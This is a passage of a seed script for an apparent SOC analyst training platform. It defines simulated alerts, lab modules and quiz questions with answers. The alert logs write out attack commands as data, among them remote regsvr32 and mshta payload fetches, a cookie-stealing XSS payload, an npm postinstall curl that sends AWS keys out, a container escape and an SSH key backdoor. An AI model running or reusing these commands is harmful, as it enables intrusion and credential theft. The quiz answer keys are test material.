    status: 'open', timestamp: '2024-03-16T22:00:00Z',
    description: '87 MFA push notifications sent to rverma in 25 minutes from attacker IP. User approved notification #87 — access granted. Classic MFA fatigue / prompt bombing.',
    raw_log: '{"User":"rverma","MFARequestCount":87,"Duration":"25min","SourceIP":"91.108.56.100","MFAApproved":true,"ApprovedAtAttempt":87,"AuthMethod":"Microsoft Authenticator Push","Result":"Success"}',
    iocs: JSON.stringify(['rverma','87 MFA pushes','91.108.56.100','MFA fatigue','MFA approved']),
    timeline: JSON.stringify([
      { time:'21:35:00', event:'First MFA push to rverma from unknown IP' },
      { time:'22:00:00', event:'87th push — rverma approves — access granted — alert fired' },
      { time:'22:00:30', event:'Attacker accesses O365, Exchange, SharePoint as rverma' },
    ]),
    network_flow: JSON.stringify({ src:'91.108.56.100', dst:'login.microsoftonline.com:443', proto:'HTTPS', bytes_sent:8700, bytes_recv:174000 }),
    recommendations: 'Revoke rverma sessions, enable number matching MFA, block 91.108.56.100.',
  },
  {
    id: 'ALT-042', severity: 'medium', category: 'Execution',
    title: 'Regsvr32 — Squiblydoo COM Scriptlet',
    source: 'Sysmon / EDR', host: 'WS-SALES-09.corp.local', src_ip: '10.10.7.92',
    dst_ip: '104.26.10.200', user: 'nsharma', process: 'regsvr32.exe',
    event_id: 4688, mitre_tactic: 'Defense Evasion', mitre_technique: 'T1218.010',
    status: 'open', timestamp: '2024-03-17T09:00:00Z',
    description: 'regsvr32.exe /s /n /u /i:http://104.26.10.200/payload.sct scrobj.dll — Squiblydoo attack. Fetches and executes COM scriptlet from remote URL. Bypasses Applocker.',
    raw_log: '{"Process":"regsvr32.exe","CommandLine":"regsvr32.exe /s /n /u /i:http://104.26.10.200/payload.sct scrobj.dll","User":"nsharma","RemoteURL":"http://104.26.10.200/payload.sct","ApplokerBypassed":true,"MOTW":false}',
    iocs: JSON.stringify(['regsvr32.exe /i:http://','scrobj.dll','payload.sct','104.26.10.200','Squiblydoo']),
    timeline: JSON.stringify([
      { time:'09:00:00', event:'regsvr32.exe Squiblydoo command executes — alert fired' },
      { time:'09:00:02', event:'payload.sct fetched from 104.26.10.200' },
      { time:'09:00:05', event:'COM scriptlet executes — reverse shell spawned' },
    ]),
    network_flow: JSON.stringify({ src:'10.10.7.92:58901', dst:'104.26.10.200:80', proto:'HTTP', bytes_sent:800, bytes_recv:14000 }),
    recommendations: 'Block regsvr32 internet access, isolate WS-SALES-09, block 104.26.10.200.',
  },
  {
    id: 'ALT-043', severity: 'medium', category: 'Persistence',
    title: 'WMI Event Subscription — Persistence Mechanism',
    source: 'Sysmon / EDR', host: 'WS-FIN-03.corp.local', src_ip: '10.10.5.33',
    dst_ip: 'N/A', user: 'SYSTEM', process: 'WmiPrvSE.exe',
    event_id: 19, mitre_tactic: 'Persistence', mitre_technique: 'T1546.003',
    status: 'open', timestamp: '2024-03-16T01:00:00Z',
    description: 'WMI permanent event subscription created: triggers powershell.exe execution every time Win32_ProcessStartTrace fires for "notepad.exe". Fileless persistence.',
    raw_log: '{"EventID":19,"EventFilter":"SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName=\'notepad.exe\'","EventConsumer":"CommandLineEventConsumer","Command":"powershell.exe -w hidden -enc JABjAGwAaQBlAG4AdA==","Created":"SYSTEM","Host":"WS-FIN-03"}',
    iocs: JSON.stringify(['WMI subscription','Win32_ProcessStartTrace','CommandLineEventConsumer','powershell -enc','fileless']),
    timeline: JSON.stringify([
      { time:'01:00:00', event:'WMI event subscription created — EventID 19 — alert fired' },
      { time:'09:15:00', event:'User opens notepad.exe — WMI triggers payload' },
      { time:'09:15:05', event:'Hidden PowerShell executes encoded C2 command' },
    ]),
    network_flow: JSON.stringify({ src:'10.10.5.33', dst:'N/A', proto:'local', bytes_sent:0, bytes_recv:0 }),
    recommendations: 'Remove WMI subscription, hunt for WMI persistence across all hosts, restrict WMI on endpoints.',
  },
  {
    id: 'ALT-044', severity: 'high', category: 'Exfiltration',
    title: 'USB Mass Storage — 60GB Data Transfer',
    source: 'DLP / Endpoint', host: 'WS-FINANCE-01.corp.local', src_ip: '10.10.5.5',
    dst_ip: 'N/A', user: 'kmalhotra', process: 'explorer.exe',
    event_id: null, mitre_tactic: 'Exfiltration', mitre_technique: 'T1052.001',
    status: 'open', timestamp: '2024-03-15T17:00:00Z',
    description: 'USB mass storage device (Kingston 128GB) inserted by kmalhotra. 60.2 GB of financial data copied in 2 hours. kmalhotra has resignation accepted — final week.',
    raw_log: '{"Device":"Kingston DataTraveler 128GB","Serial":"KD128-77ABCD","User":"kmalhotra","BytesCopied":64644014080,"FilescopyCopied":14892,"Duration":"2hr","EmployeeStatus":"resigning_final_week","DataClassification":"Financial-Confidential"}',
    iocs: JSON.stringify(['Kingston DataTraveler KD128-77ABCD','kmalhotra','60GB copied','14892 files','resigning']),
    timeline: JSON.stringify([
      { time:'15:00:00', event:'USB inserted by kmalhotra — DLP alert fires' },
      { time:'15:10:00', event:'Mass file copy begins from Finance shares' },
      { time:'17:00:00', event:'60.2 GB transferred — USB removed' },
    ]),
    network_flow: JSON.stringify({ src:'USB device', dst:'10.10.5.5', proto:'USB', bytes_sent:0, bytes_recv:64644014080 }),
    recommendations: 'Confiscate USB, HR/Legal notification, disable kmalhotra immediately, forensic image of device.',
  },
  {
    id: 'ALT-045', severity: 'high', category: 'Web Application',
    title: 'XSS — Stored Payload in Customer Portal',
    source: 'WAF / App Logs', host: 'portal.corp.local', src_ip: '103.31.4.200',
    dst_ip: '10.10.20.10', user: 'anonymous', process: 'nginx',
    event_id: null, mitre_tactic: 'Collection', mitre_technique: 'T1185',
    status: 'open', timestamp: '2024-03-16T12:30:00Z',
    description: 'Stored XSS payload in customer "Address" field: <script>document.location="http://103.31.4.200/steal?c="+document.cookie</script>. 340 admin session cookies stolen.',
    raw_log: '{"InjectionField":"address","Payload":"<script>document.location=\'http://103.31.4.200/steal?c=\'+document.cookie</script>","Views":340,"CookiesStolen":340,"AdminViews":12,"AttackerServer":"103.31.4.200"}',
    iocs: JSON.stringify(['103.31.4.200','/steal?c=','stored XSS','340 session cookies','12 admin cookies']),
    timeline: JSON.stringify([
      { time:'12:30:00', event:'XSS payload submitted in customer address field' },
      { time:'12:30:05', event:'WAF detects malicious script tag — alert fired' },
      { time:'13:00:00', event:'340 session cookies exfiltrated via redirect' },
    ]),
    network_flow: JSON.stringify({ src:'victim_browsers', dst:'103.31.4.200:80', proto:'HTTP', bytes_sent:34000, bytes_recv:0 }),
    recommendations: 'Invalidate all session cookies, sanitize input fields, patch XSS, block 103.31.4.200.',
  },
  {
    id: 'ALT-046', severity: 'critical', category: 'Network',
    title: 'DDoS — SYN Flood — 80 Gbps',
    source: 'Network / Firewall', host: 'edge-fw.corp.local', src_ip: 'multiple',
    dst_ip: '203.0.113.10', user: 'N/A', process: 'N/A',
    event_id: null, mitre_tactic: 'Impact', mitre_technique: 'T1498.001',
    status: 'open', timestamp: '2024-03-17T08:00:00Z',
    description: 'SYN flood at 80 Gbps hitting public IP 203.0.113.10 (main web portal). 4.2 million packets/second from 12,000 source IPs (botnet). Portal unresponsive for 8 minutes.',
    raw_log: '{"AttackType":"SYN_FLOOD","TargetIP":"203.0.113.10","BandwidthGbps":80,"PacketsPerSecond":4200000,"SourceIPCount":12000,"AttackDuration":"8min","PortalStatus":"DOWN","MitigationStatus":"BGP_blackhole_applied"}',
    iocs: JSON.stringify(['SYN flood','80 Gbps','4.2M pps','12000 source IPs','203.0.113.10']),
    timeline: JSON.stringify([
      { time:'08:00:00', event:'SYN flood begins — 80 Gbps — alert fired' },
      { time:'08:02:00', event:'Portal goes unresponsive' },
      { time:'08:08:00', event:'BGP blackhole applied — attack traffic null-routed' },
    ]),
    network_flow: JSON.stringify({ src:'12000 IPs (botnet)', dst:'203.0.113.10:443', proto:'TCP/SYN', bytes_sent:80000000000, bytes_recv:0 }),
    recommendations: 'Engage DDoS protection (Cloudflare/AWS Shield), analyze botnet C2, notify upstream ISP.',
  },
  {
    id: 'ALT-047', severity: 'medium', category: 'Execution',
    title: 'mshta.exe — Remote HTA Execution',
    source: 'Sysmon / EDR', host: 'WS-OPS-14.corp.local', src_ip: '10.10.6.14',
    dst_ip: '185.234.218.100', user: 'gverma', process: 'mshta.exe',
    event_id: 4688, mitre_tactic: 'Defense Evasion', mitre_technique: 'T1218.005',
    status: 'open', timestamp: '2024-03-16T10:00:00Z',
    description: 'mshta.exe executed remote HTA file: mshta.exe http://185.234.218.100/update.hta. HTA files execute VBScript/JScript without browser security zones.',
    raw_log: '{"Process":"mshta.exe","CommandLine":"mshta.exe http://185.234.218.100/update.hta","User":"gverma","RemoteFile":"update.hta","ScriptType":"VBScript","PayloadSize":14336,"C2":"185.234.218.100"}',
    iocs: JSON.stringify(['mshta.exe http://','update.hta','185.234.218.100','VBScript','gverma']),
    timeline: JSON.stringify([
      { time:'10:00:00', event:'mshta.exe fetches and executes update.hta — alert fired' },
      { time:'10:00:05', event:'VBScript in HTA downloads stage-2 payload' },
    ]),
    network_flow: JSON.stringify({ src:'10.10.6.14:59001', dst:'185.234.218.100:80', proto:'HTTP', bytes_sent:1200, bytes_recv:14336 }),
    recommendations: 'Block mshta.exe in Applocker, isolate WS-OPS-14, block 185.234.218.100.',
  },
  {
    id: 'ALT-048', severity: 'high', category: 'Cloud Security',
    title: 'Kubernetes — Privileged Container Escape',
    source: 'Falco / K8s Audit', host: 'k8s-worker-03', src_ip: '10.10.50.3',
    dst_ip: '10.10.50.1', user: 'root', process: 'runc',
    event_id: null, mitre_tactic: 'Privilege Escalation', mitre_technique: 'T1611',
    status: 'open', timestamp: '2024-03-17T05:30:00Z',
    description: 'Container spawned with --privileged flag mounted the host filesystem. nsenter used to escape into host namespace. Root on k8s-worker-03 achieved from within pod.',
    raw_log: '{"PodName":"debug-pod-7d9f8","Namespace":"default","Privileged":true,"HostPID":true,"Command":"nsenter --mount=/proc/1/ns/mnt -- /bin/bash","HostFilesystemMounted":true,"EscapeSuccessful":true,"K8sNode":"k8s-worker-03"}',
    iocs: JSON.stringify(['privileged container','nsenter --mount','host PID namespace','k8s-worker-03','debug-pod']),
    timeline: JSON.stringify([
      { time:'05:25:00', event:'debug-pod deployed with privileged:true' },
      { time:'05:30:00', event:'nsenter escapes to host namespace — alert fired' },
      { time:'05:30:10', event:'Root shell on k8s-worker-03 achieved' },
    ]),
    network_flow: JSON.stringify({ src:'10.10.50.3', dst:'10.10.50.1', proto:'local/nsenter', bytes_sent:0, bytes_recv:0 }),
    recommendations: 'Delete debug-pod, enforce PodSecurityPolicy/OPA (no privileged), audit all pods for privileged flag.',
  },
  {
    id: 'ALT-049', severity: 'high', category: 'Persistence',
    title: 'SSH Authorized Keys — Backdoor on Linux Server',
    source: 'Linux Auditd / SIEM', host: 'app-linux-02.corp.local', src_ip: '10.10.20.2',
    dst_ip: 'N/A', user: 'www-data', process: 'bash',
    event_id: null, mitre_tactic: 'Persistence', mitre_technique: 'T1098.004',
    status: 'open', timestamp: '2024-03-16T03:15:00Z',
    description: 'www-data (web application user) wrote an SSH public key to /root/.ssh/authorized_keys. Attacker achieves persistent root SSH access. Likely post-webshell activity.',
    raw_log: '{"Action":"FILE_WRITE","Path":"/root/.ssh/authorized_keys","User":"www-data","Command":"echo ssh-rsa AAAAB3NzaC1...attacker@pwned >> /root/.ssh/authorized_keys","Sudo":false,"PriorActivity":"webshell_detected_02:55"}',
    iocs: JSON.stringify(['www-data writes to /root/.ssh','ssh-rsa AAAAB3NzaC1','authorized_keys backdoor','webshell','10.10.20.2']),
    timeline: JSON.stringify([
      { time:'02:55:00', event:'Webshell uploaded via PHP file upload vulnerability' },
      { time:'03:15:00', event:'www-data writes SSH key to /root/.ssh — alert fired' },
      { time:'03:16:00', event:'Attacker connects via SSH as root — persistent access' },
    ]),
    network_flow: JSON.stringify({ src:'external', dst:'10.10.20.2:22', proto:'SSH', bytes_sent:12000, bytes_recv:8000 }),
    recommendations: 'Remove rogue SSH key, kill webshell, patch file upload endpoint, rotate all SSH keys on server.',
  },
  {
    id: 'ALT-050', severity: 'critical', category: 'Supply Chain',
    title: 'Supply Chain — Malicious npm Package',
    source: 'SAST / CI-CD Pipeline', host: 'ci-build-01.corp.local', src_ip: '10.10.15.10',
    dst_ip: '185.199.108.200', user: 'ci-runner', process: 'node',
    event_id: null, mitre_tactic: 'Initial Access', mitre_technique: 'T1195.002',
    status: 'open', timestamp: '2024-03-15T06:00:00Z',
    description: 'npm package "lodash-utils-extra" (typosquat of lodash-utils) pulled in CI build. Package contains postinstall script exfiltrating AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY env vars.',
    raw_log: '{"Package":"lodash-utils-extra","Version":"1.0.3","LegitPackage":"lodash-utils","PostInstallScript":"curl -s http://185.199.108.200/c?k=$AWS_ACCESS_KEY_ID&s=$AWS_SECRET_ACCESS_KEY","EnvVarsExposed":["AWS_ACCESS_KEY_ID","AWS_SECRET_ACCESS_KEY"],"BuildHost":"ci-build-01"}',
    iocs: JSON.stringify(['lodash-utils-extra','postinstall exfil','185.199.108.200','AWS_ACCESS_KEY_ID','typosquat']),
    timeline: JSON.stringify([
      { time:'06:00:00', event:'CI build installs lodash-utils-extra (typosquat)' },
      { time:'06:00:10', event:'postinstall script runs — AWS keys exfiltrated — alert fired' },
      { time:'06:00:15', event:'AWS keys used to list S3 buckets from 185.199.108.200' },
    ]),
    network_flow: JSON.stringify({ src:'10.10.15.10:60234', dst:'185.199.108.200:80', proto:'HTTP', bytes_sent:2400, bytes_recv:800 }),
    recommendations: 'Rotate AWS keys IMMEDIATELY, remove package from builds, add npm audit to CI pipeline, block 185.199.108.200.',
  },
];

// ── seed alerts table ─────────────────────────────────────
db.prepare(`CREATE TABLE IF NOT EXISTS soc_alerts (
  id TEXT PRIMARY KEY,
  severity TEXT,
  category TEXT,
  title TEXT,
  source TEXT,
  host TEXT,
  src_ip TEXT,
  dst_ip TEXT,
  username TEXT,
  process TEXT,
  event_id INTEGER,
  mitre_tactic TEXT,
  mitre_technique TEXT,
  status TEXT DEFAULT 'open',
  timestamp TEXT,
  description TEXT,
  raw_log TEXT,
  iocs TEXT,
  timeline TEXT,
  network_flow TEXT,
  recommendations TEXT
)`).run();

const insertAlert = db.prepare(`
  INSERT OR REPLACE INTO soc_alerts
  (id,severity,category,title,source,host,src_ip,dst_ip,username,process,
   event_id,mitre_tactic,mitre_technique,status,timestamp,description,
   raw_log,iocs,timeline,network_flow,recommendations)
  VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`);

for (const a of alerts) {
  insertAlert.run(
    a.id, a.severity, a.category, a.title, a.source, a.host,
    a.src_ip, a.dst_ip, a.user, a.process, a.event_id || null,
    a.mitre_tactic, a.mitre_technique, a.status, a.timestamp,
    a.description, a.raw_log, a.iocs, a.timeline, a.network_flow,
    a.recommendations
  );
}
console.log(`✓ ${alerts.length} SOC alerts seeded`);

// ── labs ──────────────────────────────────────────────────
const labs = [
  {
    slug: 'alert-triage-basics',
    title: 'Alert Triage Fundamentals',
    description: 'Learn to classify, prioritise and document security alerts. Investigate real alerts from the SOC dashboard.',
    difficulty: 'Beginner',
    category: 'SOC Operations',
    points: 100,
    alert_refs: JSON.stringify(['ALT-001','ALT-016','ALT-027']),
    order_index: 1,
  },
  {
    slug: 'credential-attacks',
    title: 'Credential Attacks & Identity',
    description: 'Investigate brute force, password spray, Kerberoasting, and credential dumping using Windows event logs.',
    difficulty: 'Intermediate',
    category: 'Credential Security',
    points: 150,
    alert_refs: JSON.stringify(['ALT-001','ALT-002','ALT-003','ALT-004','ALT-036','ALT-037']),
    order_index: 2,
  },
  {
    slug: 'malware-analysis',
    title: 'Malware & Execution Techniques',
    description: 'Analyse malware execution chains, LOLBins, process injection and ransomware indicators from EDR logs.',
    difficulty: 'Intermediate',
    category: 'Threat Analysis',
    points: 150,
    alert_refs: JSON.stringify(['ALT-005','ALT-006','ALT-007','ALT-008','ALT-031','ALT-033']),
    order_index: 3,
  },
  {
    slug: 'lateral-movement',
    title: 'Lateral Movement & Persistence',
    description: 'Trace attacker movement across the network using SMB, PsExec, WMI and scheduled tasks.',
    difficulty: 'Advanced',
    category: 'Threat Hunting',
    points: 200,
    alert_refs: JSON.stringify(['ALT-009','ALT-010','ALT-011','ALT-012','ALT-013','ALT-043']),
    order_index: 4,
  },
  {
    slug: 'exfiltration-detection',
    title: 'Data Exfiltration Detection',
    description: 'Identify data theft via cloud storage, DNS tunnelling, email rules and USB — investigate the full kill chain.',
    difficulty: 'Advanced',
    category: 'Data Protection',
    points: 200,
    alert_refs: JSON.stringify(['ALT-014','ALT-015','ALT-022','ALT-034','ALT-044']),
    order_index: 5,
  },
  {
    slug: 'incident-response',
    title: 'Incident Response — Full Attack Chain',
    description: 'End-to-end IR simulation. Attacker goes from phishing to domain admin. You investigate, contain and report.',
    difficulty: 'Expert',
    category: 'Incident Response',
    points: 300,
    alert_refs: JSON.stringify(['ALT-018','ALT-006','ALT-003','ALT-009','ALT-036','ALT-037','ALT-005']),
    order_index: 6,
  },
];

db.prepare(`CREATE TABLE IF NOT EXISTS labs (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  slug TEXT UNIQUE NOT NULL,
  title TEXT NOT NULL,
  description TEXT,
  difficulty TEXT,
  category TEXT,
  points INTEGER DEFAULT 100,
  alert_refs TEXT DEFAULT '[]',
  order_index INTEGER DEFAULT 0
)`).run();

// Add alert_refs column if upgrading from old schema
try { db.prepare('ALTER TABLE labs ADD COLUMN alert_refs TEXT DEFAULT "[]"').run(); } catch(e) {}

const insertLab = db.prepare(`
  INSERT OR IGNORE INTO labs (slug,title,description,difficulty,category,points,alert_refs,order_index)
  VALUES (?,?,?,?,?,?,?,?)`);
for (const l of labs) {
  insertLab.run(l.slug,l.title,l.description,l.difficulty,l.category,l.points,l.alert_refs,l.order_index);
}
console.log(`✓ ${labs.length} labs seeded`);

// ── questions ─────────────────────────────────────────────
const questions = [
  // ── Lab 1: Alert Triage Basics ─────────────────────────
  { lab_slug:'alert-triage-basics', order_index:1, points:20, difficulty:'easy', answer_type:'choice',
    question:'Open ALT-001 in the SOC Dashboard. How many failed login attempts triggered this alert?',
    options:JSON.stringify(['100','250','487','1000']),
    correct_answer:'487',
    hint:'Check the raw log — look for the Count field in the EventID 4625 entry.',
    explanation:'The raw log shows "Count":487 — 487 failed logon attempts against Administrator from 10.10.5.44 in under 4 minutes triggered the alert threshold.' },

  { lab_slug:'alert-triage-basics', order_index:2, points:20, difficulty:'easy', answer_type:'choice',
    question:'ALT-001: What is the MITRE ATT&CK technique ID for this brute force attack?',
    options:JSON.stringify(['T1078','T1110.001','T1558.003','T1059.001']),
    correct_answer:'T1110.001',
    hint:'Look at the MITRE Technique field on ALT-001.',
    explanation:'T1110.001 is Brute Force: Password Guessing — the attacker repeatedly tried common passwords against the Administrator account.' },

  { lab_slug:'alert-triage-basics', order_index:3, points:20, difficulty:'medium', answer_type:'choice',
    question:'ALT-016 shows an internal network scan. What scan type was used?',
    options:JSON.stringify(['UDP scan','XMAS scan','TCP SYN scan','FIN scan']),
    correct_answer:'TCP SYN scan',
    hint:'Check the raw log ScanType field in ALT-016.',
    explanation:'A TCP SYN (half-open) scan was used — it sends SYN packets but never completes the handshake, making it harder to detect than a full connect scan.' },

  { lab_slug:'alert-triage-basics', order_index:4, points:20, difficulty:'medium', answer_type:'choice',
    question:'ALT-027: Windows Defender was disabled. What registry value was set?',
    options:JSON.stringify(['DisableRealtimeMonitoring=1','DisableAntiSpyware=1','DisableAntiVirus=1','DisableBehaviourMonitoring=1']),
    correct_answer:'DisableAntiSpyware=1',
    hint:'Look at the TargetObject field in the ALT-027 raw log.',
    explanation:'The key HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware was set to 1 (DWORD), disabling Windows Defender entirely.' },

  { lab_slug:'alert-triage-basics', order_index:5, points:20, difficulty:'hard', answer_type:'choice',
    question:'Looking at ALT-001 timeline, what happened at 02:14:44 — 11 seconds after the alert fired?',
    options:JSON.stringify(['Host was isolated','Attacker disconnected','Account lockout policy triggered','Analyst acknowledged the alert']),
    correct_answer:'Account lockout policy triggered',
    hint:'Check the timeline section of ALT-001.',
    explanation:'The account lockout policy automatically triggered at 02:14:44, locking the Administrator account after the failed attempt threshold was hit.' },

  // ── Lab 2: Credential Attacks ─────────────────────────
  { lab_slug:'credential-attacks', order_index:1, points:30, difficulty:'easy', answer_type:'choice',
    question:'ALT-002 is a password spray. What password was used across all 142 accounts?',
    options:JSON.stringify(['Password123','Admin@2024','Spring2024!','Welcome1']),
    correct_answer:'Spring2024!',
    hint:'Check the description of ALT-002 or the raw log.',
    explanation:'The attacker used "Spring2024!" — a password spray uses ONE password across many accounts to avoid lockout, exploiting predictable seasonal passwords.' },

  { lab_slug:'credential-attacks', order_index:2, points:30, difficulty:'medium', answer_type:'choice',
    question:'ALT-003: What tool was used to dump credentials from LSASS?',
    options:JSON.stringify(['ProcDump','Task Manager','mimikatz.exe','WCE']),
    correct_answer:'mimikatz.exe',
    hint:'The Process field in ALT-003 raw log shows the tool name.',
    explanation:'mimikatz.exe with "sekurlsa::logonpasswords" was used — it opens LSASS with PROCESS_VM_READ to read plaintext credentials and NTLM hashes from memory.' },

  { lab_slug:'credential-attacks', order_index:3, points:30, difficulty:'medium', answer_type:'choice',
    question:'ALT-004 is a Kerberoasting attack. What encryption type makes it vulnerable to offline cracking?',
    options:JSON.stringify(['AES-256','AES-128','RC4-HMAC','DES']),
    correct_answer:'RC4-HMAC',
    hint:'Look at TicketEncryptionType in the ALT-004 raw log.',
    explanation:'RC4-HMAC (encryption type 0x17) tickets can be cracked offline. Attackers request service tickets for accounts with SPNs and crack the RC4 hash with hashcat/JohnTheRipper.' },

  { lab_slug:'credential-attacks', order_index:4, points:30, difficulty:'hard', answer_type:'choice',
    question:'ALT-036 (DCSync): Why is a non-DC host calling DS-Replication-Get-Changes suspicious?',
    options:JSON.stringify(['Only DCs should replicate AD data','It uses an insecure protocol','The account is a service account','The time is outside business hours']),
    correct_answer:'Only DCs should replicate AD data',
    hint:'Think about what AD replication is for and who legitimately does it.',
    explanation:'AD replication (GetNCChanges) should ONLY occur between Domain Controllers. When a regular workstation calls this API, it means an attacker is using a compromised DC-privileged account to dump all NTDS.dit hashes — a DCSync attack.' },

  { lab_slug:'credential-attacks', order_index:5, points:30, difficulty:'hard', answer_type:'choice',
    question:'ALT-037 (Golden Ticket): What must the attacker have obtained BEFORE creating a Golden Ticket?',
    options:JSON.stringify(['Domain Admin password','krbtgt account NTLM hash','All user NTLM hashes','SYSVOL access']),
    correct_answer:'krbtgt account NTLM hash',
    hint:'A Golden Ticket is a forged Kerberos TGT — what key signs legitimate TGTs?',
    explanation:'The krbtgt account hash is used by the KDC to sign all Kerberos TGTs. With this hash, an attacker can forge TGTs for any user/group with any validity period — complete domain compromise.' },

  // ── Lab 3: Malware & Execution ─────────────────────────
  { lab_slug:'malware-analysis', order_index:1, points:30, difficulty:'easy', answer_type:'choice',
    question:'ALT-005: What extension were encrypted files renamed to during the ransomware attack?',
    options:JSON.stringify(['.encrypted','.locked','.ransom','.crypt']),
    correct_answer:'.locked',
    hint:'Check the raw log Extension field in ALT-005.',
    explanation:'Files were renamed with the .locked extension. The ransomware also deleted shadow copies (vssadmin delete shadows /all /quiet) to prevent recovery.' },

  { lab_slug:'malware-analysis', order_index:2, points:30, difficulty:'medium', answer_type:'choice',
    question:'ALT-006: PowerShell C2 beacon — what was the parent process of powershell.exe?',
    options:JSON.stringify(['explorer.exe','cmd.exe','svchost.exe','OUTLOOK.EXE']),
    correct_answer:'OUTLOOK.EXE',
    hint:'Check the ParentProcess field in ALT-006 raw log.',
    explanation:'OUTLOOK.EXE spawning powershell.exe is a classic phishing indicator — user opened a malicious email attachment that triggered macro/script execution via Outlook.' },

  { lab_slug:'malware-analysis', order_index:3, points:30, difficulty:'medium', answer_type:'choice',
    question:'ALT-008 (Process Hollowing): What is the expected parent process of svchost.exe?',
    options:JSON.stringify(['explorer.exe','winlogon.exe','services.exe','lsass.exe']),
    correct_answer:'services.exe',
    hint:'Think about the normal Windows boot process — which process launches Windows services?',
    explanation:'Legitimate svchost.exe instances are always spawned by services.exe. When explorer.exe spawns svchost.exe, it is almost certainly process injection or hollowing — a strong IOC.' },

  { lab_slug:'malware-analysis', order_index:4, points:30, difficulty:'hard', answer_type:'choice',
    question:'ALT-031: certutil.exe was used to download a file. What LOLBin category does this fall under?',
    options:JSON.stringify(['Credential access','Signed binary proxy execution','Scheduled task abuse','Registry manipulation']),
    correct_answer:'Signed binary proxy execution',
    hint:'Think about why certutil.exe is dangerous — it is a Microsoft-signed binary.',
    explanation:'certutil.exe is a LOLBIN (Living-off-the-Land Binary) used for "Signed Binary Proxy Execution" (T1218). Because it is a trusted, signed Microsoft binary, it bypasses application whitelisting and may not trigger AV alerts.' },

  { lab_slug:'malware-analysis', order_index:5, points:30, difficulty:'hard', answer_type:'choice',
    question:'ALT-033: REvil ransomware was detected pre-execution. What stopped it from encrypting files?',
    options:JSON.stringify(['Firewall blocked C2','User reported suspicious file','EDR behavioral engine quarantined it','Scheduled task was deleted']),
    correct_answer:'EDR behavioral engine quarantined it',
    hint:'Check the ALT-033 timeline at 04:00:05.',
    explanation:'The EDR behavioral engine detected pre-encryption activity (shadow copy deletion, file access patterns) and quarantined the binary on all 4 hosts before encryption began — demonstrating the value of behavior-based detection over signature detection.' },

  // ── Lab 4: Lateral Movement ────────────────────────────
  { lab_slug:'lateral-movement', order_index:1, points:40, difficulty:'medium', answer_type:'choice',
    question:'ALT-009 (Pass-the-Hash): What authentication protocol was used — and why is that suspicious?',
    options:JSON.stringify(['Kerberos — it should use NTLM','NTLM — it should use Kerberos','SMB — it should use RDP','LDAP — it should use HTTPS']),
    correct_answer:'NTLM — it should use Kerberos',
    hint:'In a modern Active Directory environment, which protocol is preferred?',
    explanation:'In modern AD environments, Kerberos is used for authentication. A Logon Type 3 (network) authentication using NTLM only (no Kerberos) is a Pass-the-Hash indicator — PtH requires NTLM as it replays the hash, not a password.' },

  { lab_slug:'lateral-movement', order_index:2, points:40, difficulty:'medium', answer_type:'choice',
    question:'ALT-010: PsExec was used on 9 hosts. What Windows Event ID indicates a new service was installed?',
    options:JSON.stringify(['4624','4688','7045','4662']),
    correct_answer:'7045',
    hint:'PsExec works by installing the PSEXESVC service — what event covers new service installation?',
    explanation:'EventID 7045 (System log) indicates a new service was installed. PsExec installs PSEXESVC.exe as a temporary service on the remote host to execute commands — detecting 7045 for PSEXESVC is a reliable PsExec indicator.' },

  { lab_slug:'lateral-movement', order_index:3, points:40, difficulty:'hard', answer_type:'choice',
    question:'ALT-011: The Run key was set to updater.exe with entropy 7.94. What does high entropy indicate?',
    options:JSON.stringify(['The file is large','The file is packed or encrypted','The file is a legitimate Windows binary','The file was recently modified']),
    correct_answer:'The file is packed or encrypted',
    hint:'Entropy measures randomness — a value near 8.0 means the data is very random.',
    explanation:'File entropy near 8.0 (maximum) indicates the binary is packed, compressed, or encrypted. Legitimate Windows binaries typically have entropy 5.0-7.0. Malware authors pack binaries to evade signature-based detection.' },

  { lab_slug:'lateral-movement', order_index:4, points:40, difficulty:'hard', answer_type:'choice',
    question:'ALT-043 (WMI Persistence): What triggers the malicious PowerShell payload to execute?',
    options:JSON.stringify(['User login','System startup','notepad.exe process creation','Network connection']),
    correct_answer:'notepad.exe process creation',
    hint:'Check the EventFilter in the ALT-043 raw log.',
    explanation:'The WMI event subscription triggers on Win32_ProcessStartTrace WHERE ProcessName="notepad.exe" — every time a user opens Notepad, the hidden PowerShell payload executes. This is fileless persistence — no new file on disk.' },

  { lab_slug:'lateral-movement', order_index:5, points:40, difficulty:'expert', answer_type:'choice',
    question:'ALT-013: A new local admin "helpdesk_svc" was created. Which TWO Event IDs confirm this (user creation + group add)?',
    options:JSON.stringify(['4720 + 4732','4624 + 4625','4688 + 4697','4662 + 4663']),
    correct_answer:'4720 + 4732',
    hint:'One event creates the user, another adds them to a group.',
    explanation:'EventID 4720 = new user account created. EventID 4732 = member added to security-enabled local group (Administrators). Together these confirm the attacker created a backdoor admin account.' },

  // ── Lab 5: Exfiltration Detection ─────────────────────
  { lab_slug:'exfiltration-detection', order_index:1, points:40, difficulty:'medium', answer_type:'choice',
    question:'ALT-014: How much data was uploaded to Mega.nz and how many files were involved?',
    options:JSON.stringify(['1.2 GB / 200 files','4.7 GB / 890 files','10 GB / 5000 files','500 MB / 100 files']),
    correct_answer:'4.7 GB / 890 files',
    hint:'Check the description or raw log BytesUploaded and FilesUploaded fields in ALT-014.',
    explanation:'4.7 GB (5,049,942,016 bytes) across 890 files was uploaded to mega.nz. The analyst should note psingh downloaded from \\\\FS01\\Finance FIRST, then uploaded — a classic stage-and-exfil pattern.' },

  { lab_slug:'exfiltration-detection', order_index:2, points:40, difficulty:'medium', answer_type:'choice',
    question:'ALT-015 (DNS Tunneling): What tool is suspected based on the query pattern?',
    options:JSON.stringify(['Cobalt Strike','dnscat2','iodine','DNSChef']),
    correct_answer:'dnscat2',
    hint:'The raw log includes a SuspectedTool field.',
    explanation:'dnscat2 is a DNS tunneling tool that encodes data in DNS query subdomains. The pattern of 8,400 unique queries with 63-byte base64 subdomains and entropy score 4.82 matches the dnscat2 signature.' },

  { lab_slug:'exfiltration-detection', order_index:3, points:40, difficulty:'hard', answer_type:'choice',
    question:'ALT-034: An email forwarding rule was created. What makes the source IP suspicious?',
    options:JSON.stringify(['It is a known malware IP','vpandey has never logged in from this IP before','The IP is in a private subnet','The IP belongs to a competitor']),
    correct_answer:'vpandey has never logged in from this IP before',
